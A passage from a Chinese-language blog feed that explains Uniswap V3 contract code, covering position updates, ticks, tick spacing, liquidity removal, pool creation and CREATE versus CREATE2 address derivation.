sqrtRatioBX96 - sqrtRatioAX96, FixedPoint96.Q96)<br>                : FullMath.mulDiv(liquidity, sqrtRatioBX96 - sqrtRatioAX96, FixedPoint96.Q96);<br>    }<br>    <br>    /// @notice Helper that gets signed token0 delta<br>    /// @param sqrtRatioAX96 A sqrt price<br>    /// @param sqrtRatioBX96 Another sqrt price<br>    /// @param liquidity The change in liquidity for which to compute the amount0 delta<br>    /// @return amount0 Amount of token0 corresponding to the passed liquidityDelta between the two prices<br>    function getAmount0Delta(<br>        uint160 sqrtRatioAX96,<br>        uint160 sqrtRatioBX96,<br>        int128 liquidity<br>    ) internal pure returns (int256 amount0) {<br>        return<br>            liquidity &lt; 0<br>                ? -getAmount0Delta(sqrtRatioAX96, sqrtRatioBX96, uint128(-liquidity), false).toInt256()<br>                : getAmount0Delta(sqrtRatioAX96, sqrtRatioBX96, uint128(liquidity), true).toInt256();<br>    }<br><br>    /// @notice Helper that gets signed token1 delta<br>    /// @param sqrtRatioAX96 A sqrt price<br>    /// @param sqrtRatioBX96 Another sqrt price<br>    /// @param liquidity The change in liquidity for which to compute the amount1 delta<br>    /// @return amount1 Amount of token1 corresponding to the passed liquidityDelta between the two prices<br>    function getAmount1Delta(<br>        uint160 sqrtRatioAX96,<br>        uint160 sqrtRatioBX96,<br>        int128 liquidity<br>    ) internal pure returns (int256 amount1) {<br>        return<br>            liquidity &lt; 0<br>                ? -getAmount1Delta(sqrtRatioAX96, sqrtRatioBX96, uint128(-liquidity), false).toInt256()<br>                : getAmount1Delta(sqrtRatioAX96, sqrtRatioBX96, uint128(liquidity), true).toInt256();<br>    }<br>}<br></code></pre></td></tr></table></figure><h2 id="updatePosition"><a href="#updatePosition" class="headerlink" title="_updatePosition"></a>_updatePosition</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @dev Gets and updates a position with the given liquidity delta<br>/// @param owner the owner of the position<br>/// @param tickLower the lower tick of the position's tick range<br>/// @param tickUpper the upper tick of the position's tick range<br>/// @param tick the current tick, passed to avoid sloads<br>function _updatePosition(<br>    address owner,<br>    int24 tickLower,<br>    int24 tickUpper,<br>    int128 liquidityDelta,<br>    int24 tick<br>) private returns (Position.Info storage position) {<br>//获取用户的position<br>    position = positions.get(owner, tickLower, tickUpper);<br><br>    uint256 _feeGrowthGlobal0X128 = feeGrowthGlobal0X128; // SLOAD for gas optimization<br>    uint256 _feeGrowthGlobal1X128 = feeGrowthGlobal1X128; // SLOAD for gas optimization<br><br>    // if we need to update the ticks, do it<br>    //根据传入的参数修改position中的lower/upper tick<br>    bool flippedLower;<br>    bool flippedUpper;<br>    if (liquidityDelta != 0) {<br>        uint32 time = _blockTimestamp();<br>        //获取请求时间点的Oracle数据<br>        (int56 tickCumulative, uint160 secondsPerLiquidityCumulativeX128) =<br>            observations.observeSingle(<br>                time,<br>                0,<br>                slot0.tick,<br>                slot0.observationIndex,<br>                liquidity,<br>                slot0.observationCardinality<br>            );<br><br>        // 更新 lower tikc 和 upper tick<br>    // fippedX 变量表示是此 tick 的引用状态是否发生变化，即<br>    // 被引用 -&gt; 未被引用 或<br>    // 未被引用 -&gt; 被引用<br>    // 后续需要根据这个变量的值来更新 tick 位图<br>        flippedLower = ticks.update(<br>            tickLower,<br>            tick,<br>            liquidityDelta,<br>            _feeGrowthGlobal0X128,<br>            _feeGrowthGlobal1X128,<br>            secondsPerLiquidityCumulativeX128,<br>            tickCumulative,<br>            time,<br>            false,<br>            maxLiquidityPerTick<br>        );<br>        flippedUpper = ticks.update(<br>            tickUpper,<br>            tick,<br>            liquidityDelta,<br>            _feeGrowthGlobal0X128,<br>            _feeGrowthGlobal1X128,<br>            secondsPerLiquidityCumulativeX128,<br>            tickCumulative,<br>            time,<br>            true,<br>            maxLiquidityPerTick<br>        );<br><br>        // 如果一个 tick 第一次被引用，或者移除了所有引用<br>    // 那么更新 tick 位图<br>        if (flippedLower) {<br>            tickBitmap.flipTick(tickLower, tickSpacing);<br>        }<br>        if (flippedUpper) {<br>            tickBitmap.flipTick(tickUpper, tickSpacing);<br>        }<br>    }<br><br>    (uint256 feeGrowthInside0X128, uint256 feeGrowthInside1X128) =<br>        ticks.getFeeGrowthInside(tickLower, tickUpper, tick, _feeGrowthGlobal0X128, _feeGrowthGlobal1X128);<br><br>    //更新position<br>    position.update(liquidityDelta, feeGrowthInside0X128, feeGrowthInside1X128);<br><br>    // clear any tick data that is no longer needed<br>    // 如果移除了对 tick 的引用，那么清除之前记录的元数据<br>// 这只会发生在移除流动性的操作中<br>    if (liquidityDelta &lt; 0) {<br>        if (flippedLower) {<br>            ticks.clear(tickLower);<br>        }<br>        if (flippedUpper) {<br>            ticks.clear(tickUpper);<br>        }<br>    }<br>}<br><br></code></pre></td></tr></table></figure><h3 id="tick"><a href="#tick" class="headerlink" title="tick"></a>tick</h3><p>V3使用的等幂数列</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">p_{i}=<span class="hljs-number">1.0001</span><span class="hljs-symbol">^i</span><br><span class="hljs-comment">//调整一下</span><br>√p_{i}=(√<span class="hljs-number">1.0001</span>)<span class="hljs-symbol">^i</span><br></code></pre></td></tr></table></figure><p>这里的 <code>i</code> 也就是价格的序号，我们称之为 <code>tick</code>，而由所有序号组成的集合称之为 <code>Ticks</code>。在合约代码中，主要是以 tick 来记录流动性的区间。</p><p>在 <code>UniswapV3Pool</code> 合约中有两个状态变量记录了 tick 相关的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">    // tick 元数据管理的库<br>    using Tick for mapping(int24 =&gt; Tick.Info);<br>    // tick 位图槽位的库<br>    using TickBitmap for mapping(int16 =&gt; uint256);<br><br>    // 记录了一个 tick 包含的元数据，这里只会包含所有 Position 的 lower/upper ticks<br>    mapping(int24 =&gt; Tick.Info) public override ticks;<br>    // tick 位图，因为这个位图比较长（一共有 887272x2 个位），大部分的位不需要初始化<br>    // 因此分成两级来管理，每 256 位为一个单位，一个单位称为一个 word<br>    // map 中的键是 word 的索引<br>    mapping(int16 =&gt; uint256) public override tickBitmap;<br><br>library Tick {<br>    ...<br>    // tick 中记录的数据<br>    struct Info {<br>        // 记录了所有引用这个 tick 的 position 流动性的和<br>        uint128 liquidityGross;<br>        // 当此 tick 被越过时（从左至右），池子中整体流动性需要变化的值<br>        int128 liquidityNet;<br>        ...<br>    }<br></code></pre></td></tr></table></figure><p>tick 位图用于记录所有被引用的 lower/upper tick index，我们可以用过 tick 位图，从当前价格找到下一个（从左至右或者从右至左）被引用的 tick index。</p><p><a href="https://github.com/Uniswap/uniswap-v3-core/blob/2dc1eb9f251bad1c260d22dd392d8cedb2c6a4b5/contracts/libraries/TickBitmap.sol">tick 位图</a>有以下几个特性：</p><ul><li>对于不存在的 tick，不需要初始值，因为访问 map 中不存在的 key 默认值就是 0</li><li>通过对位图的每个 word(uint256) 建立索引来管理位图，即访问路径为 word index -&gt; word -&gt; tick bit</li></ul><p><code>liquidityGross</code>: 很好理解，每当有流动性将该 tick 设为价格区间时，不论是价格上限还是价格下限， <code>liquidityGross</code> 都会增加。换言之，当 <code>liquidityGross &gt; 0</code> 说明该 tick 已经初始化，正在被流动性使用，而 <code>liquidityGross == 0</code> 则该 tick 未初始化，没有流动性使用，计算时可以忽略。</p><p><code>liquidityNet</code> 表示当价格从左至右经过此 tick 时整体流动性需要变化的净值。在单个流动性中，对于 lower tick 来说，它的值为正，对于 upper tick 来说它的值为 负。</p><p>在注入或移除数量为 <code>l</code> 的流动性时，具体规则如下：</p><ul><li>注入流动性，tick 是价格下限，<code>liquidityNet</code> 增加 <code>l</code></li><li>注入流动性，tick 是价格上限，<code>liquidityNet</code> 减少 <code>l</code></li><li>移除流动性，tick 是价格下限，<code>liquidityNet</code> 减少 <code>l</code></li><li>移除流动性，tick 是价格上限，<code>liquidityNet</code> 增加 <code>l</code></li></ul><p>在Tick.sol中，update用于更新 tick 元数据，此函数返回的 flipped 表示此 tick 的引用状态是否发生变化，之前的 <code>_updatePosition</code> 中的代码会根据这个返回值去更新 tick 位图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function update(<br>    mapping(int24 =&gt; Tick.Info) storage self,<br>    int24 tick,<br>    int24 tickCurrent,<br>    int128 liquidityDelta,<br>    uint256 feeGrowthGlobal0X128,<br>    uint256 feeGrowthGlobal1X128,<br>    uint160 secondsPerLiquidityCumulativeX128,<br>    int56 tickCumulative,<br>    uint32 time,<br>    bool upper,<br>    uint128 maxLiquidity<br>) internal returns (bool flipped) {<br>    Tick.Info storage info = self[tick];<br><br>    uint128 liquidityGrossBefore = info.liquidityGross;<br>    uint128 liquidityGrossAfter = LiquidityMath.addDelta(liquidityGrossBefore, liquidityDelta);<br><br>    require(liquidityGrossAfter &lt;= maxLiquidity, 'LO');<br><br>    //通过 liquidityGross 在进行 position 变化前后的值来判断 tick 是否仍被引用<br>    flipped = (liquidityGrossAfter == 0) != (liquidityGrossBefore == 0);<br><br>    if (liquidityGrossBefore == 0) {<br>        // by convention, we assume that all growth before a tick was initialized happened _below_ the tick<br>        if (tick &lt;= tickCurrent) {<br>            info.feeGrowthOutside0X128 = feeGrowthGlobal0X128;<br>            info.feeGrowthOutside1X128 = feeGrowthGlobal1X128;<br>            info.secondsPerLiquidityOutsideX128 = secondsPerLiquidityCumulativeX128;<br>            info.tickCumulativeOutside = tickCumulative;<br>            info.secondsOutside = time;<br>        }<br>        info.initialized = true;<br>    }<br><br>    info.liquidityGross = liquidityGrossAfter;<br><br>    // when the lower (upper) tick is crossed left to right (right to left), liquidity must be added (removed)<br>    //更新liquidityNet的值<br>    info.liquidityNet = upper<br>        ? int256(info.liquidityNet).sub(liquidityDelta).toInt128()<br>        : int256(info.liquidityNet).add(liquidityDelta).toInt128();<br>}<br><br></code></pre></td></tr></table></figure><h3 id="tickspacing"><a href="#tickspacing" class="headerlink" title="tickspacing"></a>tickspacing</h3><p>V3 引入了费率三档可选等级和相应的 <code>tick</code> 疏密程度，也就是 <code>tickspacing</code> 。对于每一种交易对而言，都有三档可选费率等级，0.05%, 0.3%, 1%，并且以后通过社区治理，还有可能永久增加可选的挡位。每种交易费率等级都由给定的 tickspacing，比如稳定币交易对，就是 tick 之间需要间隔 10 个才是有效的可使用的 tick 。位于间隔内的 tick 虽然存在，但程序不会去初始化和使用，也就不会产生 gas 费用。因此，我们在等幂数列的基础上，进一步节省了计算消耗。</p><table><thead><tr><th align="left">费率</th><th align="left">tickspacing</th><th align="left">建议的使用范围</th></tr></thead><tbody><tr><td align="left">0.05%</td><td align="left">10</td><td align="left">稳定币交易对</td></tr><tr><td align="left">0.3%</td><td align="left">60</td><td align="left">适用大多数交易对</td></tr><tr><td align="left">1%</td><td align="left">200</td><td align="left">波动极大的交易对</td></tr></tbody></table><p>在UniswapV3Factory.sol中设定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping(uint24 =&gt; int24) public override feeAmountTickSpacing;<br><br>constructor() {<br>       owner = msg.sender;<br>       emit OwnerChanged(address(0), msg.sender);<br><br>       feeAmountTickSpacing[500] = 10;<br>       emit FeeAmountEnabled(500, 10);<br>       feeAmountTickSpacing[3000] = 60;<br>       emit FeeAmountEnabled(3000, 60);<br>       feeAmountTickSpacing[10000] = 200;<br>       emit FeeAmountEnabled(10000, 200);<br>   }<br></code></pre></td></tr></table></figure><h1 id="移除流动性"><a href="#移除流动性" class="headerlink" title="移除流动性"></a>移除流动性</h1><p>在合约UniswapV3Pool中，burn用来实现流动性的移除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function burn(<br>    int24 tickLower,<br>    int24 tickUpper,<br>    uint128 amount<br>) external override lock returns (uint256 amount0, uint256 amount1) {<br>//计算需要移除的token数<br>    (Position.Info storage position, int256 amount0Int, int256 amount1Int) =<br>        _modifyPosition(<br>            ModifyPositionParams({<br>                owner: msg.sender,<br>                tickLower: tickLower,<br>                tickUpper: tickUpper,<br>                liquidityDelta: -int256(amount).toInt128()<br>            })<br>        );<br><br>    amount0 = uint256(-amount0Int);<br>    amount1 = uint256(-amount1Int);<br><br>    //注意这里，移除流动性后，将移出的 token 数记录到了 position.tokensOwed 上<br>    if (amount0 &gt; 0 || amount1 &gt; 0) {<br>        (position.tokensOwed0, position.tokensOwed1) = (<br>            position.tokensOwed0 + uint128(amount0),<br>            position.tokensOwed1 + uint128(amount1)<br>        );<br>    }<br><br>    emit Burn(msg.sender, tickLower, tickUpper, amount, amount0, amount1);<br>}<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;提供流动性&quot;&gt;&lt;a href=&quot;#提供流动性&quot; class=&quot;headerlink&quot; title=&quot;提供流动性&quot;&gt;&lt;/a&gt;提供流动性&lt;/h1&gt;&lt;p&gt;在合约内，v3 会保存所有用户的流动性，代码内称作 &lt;code&gt;Position&lt;/code&gt;&lt;/p&gt;
&lt;figur</summary>
      
    
    
    
    
    <category term="Etherum" scheme="http://example.com/tags/Etherum/"/>
    
  </entry>
  
  <entry>
    <title>Uniswap Part Ⅰ | 创建交易对</title>
    <link href="http://example.com/2022/08/20/uniswap-v3-1/"/>
    <id>http://example.com/2022/08/20/uniswap-v3-1/</id>
    <published>2022-08-20T12:07:07.000Z</published>
    <updated>2022-09-18T08:20:28.140Z</updated>
    
    <content type="html"><![CDATA[<h1 id="创建交易对"><a href="#创建交易对" class="headerlink" title="创建交易对"></a>创建交易对</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sequence">title:CreatePool<br>User-&gt;NonfungiblePositionManager:createAndInitializePoolIfNecessary(token0,token1,fee,√p) <br>NonfungiblePositionManager-&gt;UniswapV3Factory:createPool<br>UniswapV3Factory-&gt;UniswapV3Pool:deploy<br>NonfungiblePositionManager-&gt;UniswapV3Pool:initialize<br></code></pre></td></tr></table></figure><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>NonfungiblePositionManager中有一些全局变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @dev IDs of pools assigned by this contract<br>//_poolIds记录所有交易池的地址和编号的对应关系<br>mapping(address =&gt; uint80) private _poolIds;<br><br>/// @dev Pool keys by pool ID, to save on SSTOREs for position data<br>//_poolIdToPoolKey记录交易池编号和PoolKey的对应关系。PoolKey中包含了token0，token1，fee<br>mapping(uint80 =&gt; PoolAddress.PoolKey) private _poolIdToPoolKey;<br><br>/// @dev The token ID position data<br>mapping(uint256 =&gt; Position) private _positions;<br><br>/// @dev The ID of the next token that will be minted. Skips 0<br>//position的编号<br>uint176 private _nextId = 1;<br>/// @dev The ID of the next pool that is used for the first time. Skips 0<br>//每一个Pool的唯一编号<br>uint80 private _nextPoolId = 1;<br><br>/// @dev The address of the token descriptor contract, which handles generating token URIs for position tokens<br>address private immutable _tokenDescriptor;<br></code></pre></td></tr></table></figure><p>还有一个构造函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">constructor(<br>    address _factory, //UniswapV3Factory的地址<br>    address _WETH9, //ETH智能合约的地址<br>    address _tokenDescriptor_ //ERC721描述信息的接口地址<br>) ERC721Permit(&#x27;Uniswap V3 Positions NFT-V1&#x27;, &#x27;UNI-V3-POS&#x27;, &#x27;1&#x27;) PeripheryImmutableState(_factory, _WETH9) &#123;<br>    _tokenDescriptor = _tokenDescriptor_;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="createAndInitializePoolIfNecessary"><a href="#createAndInitializePoolIfNecessary" class="headerlink" title="createAndInitializePoolIfNecessary"></a>createAndInitializePoolIfNecessary</h2><p>NonfungiblePositionManager合约继承了抽象合约PoolInitializer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract NonfungiblePositionManager is<br>    INonfungiblePositionManager,<br>    Multicall,<br>    ERC721Permit,<br>    PeripheryImmutableState,<br>    PoolInitializer,<br>    LiquidityManagement,<br>    PeripheryValidation,<br>    SelfPermit<br>&#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>createAndInitializePoolIfNecessary方法写在抽象合约PoolInitializer中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @title Creates and initializes V3 Pools<br>abstract contract PoolInitializer is IPoolInitializer, PeripheryImmutableState &#123;<br>    /// @inheritdoc IPoolInitializer<br>    function createAndInitializePoolIfNecessary(<br>        address token0,<br>        address token1,<br>        uint24 fee,<br>        uint160 sqrtPriceX96<br>    ) external payable override returns (address pool) &#123;<br>        require(token0 &lt; token1);<br>        //查看交易对是否已经创建<br>        pool = IUniswapV3Factory(factory).getPool(token0, token1, fee);<br><br>        if (pool == address(0)) &#123;<br>            pool = IUniswapV3Factory(factory).createPool(token0, token1, fee);<br>            IUniswapV3Pool(pool).initialize(sqrtPriceX96);<br>        &#125; else &#123;<br>            (uint160 sqrtPriceX96Existing, , , , , , ) = IUniswapV3Pool(pool).slot0();<br>            if (sqrtPriceX96Existing == 0) &#123;<br>                IUniswapV3Pool(pool).initialize(sqrtPriceX96);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="getPool"><a href="#getPool" class="headerlink" title="getPool"></a>getPool</h3><p>IUniswapV3Factory中的getPool函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @notice Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist<br>/// @dev tokenA and tokenB may be passed in either token0/token1 or token1/token0 order<br>/// @param tokenA The contract address of either token0 or token1<br>/// @param tokenB The contract address of the other token<br>/// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip<br>/// @return pool The pool address<br>function getPool(<br>    address tokenA,<br>    address tokenB,<br>    uint24 fee<br>) external view returns (address pool);<br></code></pre></td></tr></table></figure><p>在UniswapV3Factory中的getPool</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UniswapV3Factory is IUniswapV3Factory, UniswapV3PoolDeployer, NoDelegateCall &#123;<br>    ...<br>    mapping(address =&gt; mapping(address =&gt; mapping(uint24 =&gt; address))) public override getPool;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="createPool"><a href="#createPool" class="headerlink" title="createPool"></a>createPool</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @inheritdoc IUniswapV3Factory<br>    function createPool(<br>        address tokenA,<br>        address tokenB,<br>        uint24 fee //期望的费率<br>    ) external override noDelegateCall returns (address pool) &#123;<br>    //检查是否是同一token<br>        require(tokenA != tokenB);<br>        //将TokenA与TokenB根据地址进行升序排列<br>        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);<br>        //检查token0是否为空地址<br>        require(token0 != address(0));<br>        //根据费率检索TickSpace并检查TickSpace是否为0<br>        int24 tickSpacing = feeAmountTickSpacing[fee];<br>        require(tickSpacing != 0);<br>        //检查当前新建的池子是否已经存在<br>        require(getPool[token0][token1][fee] == address(0));<br>        //核心是调用 deploy 函数完成交易对的创建<br>        pool = deploy(address(this), token0, token1, fee, tickSpacing);<br>        getPool[token0][token1][fee] = pool;<br>        // populate mapping in the reverse direction, deliberate choice to avoid the cost of comparing addresses<br>        //提供了反向映射，减少后期检索时比较地址的成本<br>        getPool[token1][token0][fee] = pool;<br>        emit PoolCreated(token0, token1, fee, tickSpacing, pool);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h2><p>位于合约UniswapV3PoolDeployer中，被UniswapV3Factory继承</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @dev Deploys a pool with the given parameters by transiently setting the parameters storage slot and then<br>/// clearing it after deploying the pool.<br>/// @param factory The contract address of the Uniswap V3 factory<br>/// @param token0 The first token of the pool by address sort order<br>/// @param token1 The second token of the pool by address sort order<br>/// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip<br>/// @param tickSpacing The spacing between usable ticks<br>function deploy(<br>    address factory,<br>    address token0,<br>    address token1,<br>    uint24 fee,<br>    int24 tickSpacing<br>) internal returns (address pool) &#123;<br>    parameters = Parameters(&#123;factory: factory, token0: token0, token1: token1, fee: fee, tickSpacing: tickSpacing&#125;);<br>    pool = address(new UniswapV3Pool&#123;salt: keccak256(abi.encode(token0, token1, fee))&#125;());<br>    delete parameters;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="CREATE2和CREATE"><a href="#CREATE2和CREATE" class="headerlink" title="CREATE2和CREATE"></a>CREATE2和CREATE</h3><p>CREATE指令创建的合约地址是通通过交易发起者（sender）的地址以及交易序号（nonce）来计算确定的。sender 和 nonce 进行 RLP 编码，然后用 Keccak-256 进行 hash 计算（伪码）：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">keccak256</span><span class="hljs-params">(rlp([sender, nonce])</span></span>)<br></code></pre></td></tr></table></figure><p>而 CREATE2 指令则主要是根据创建合约的初始化代码(init_code)及盐（slat） 生成(伪码)，让生成的合约地址更具有可控性：</p><p>一般而言init_code==bytecode，就是编译生成的字节码，借此让地址变成了对合约代码的验证</p><p>CREATE2 的另一个值得注意的（有用的）是，由于其对计算合约地址的参数多了一点控制， <strong>如果一个合约自毁了，那么新合约未来可以再次部署到这个地址上</strong>。但是，如果已经有非自毁合约部署到这个地址上了，那么 CREATE2 不能在这个地址上再次部署一个合约。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">keccak256</span>(<span class="hljs-number">0</span><span class="hljs-variable">xff</span> + <span class="hljs-variable"><span class="hljs-class">sender</span></span> + <span 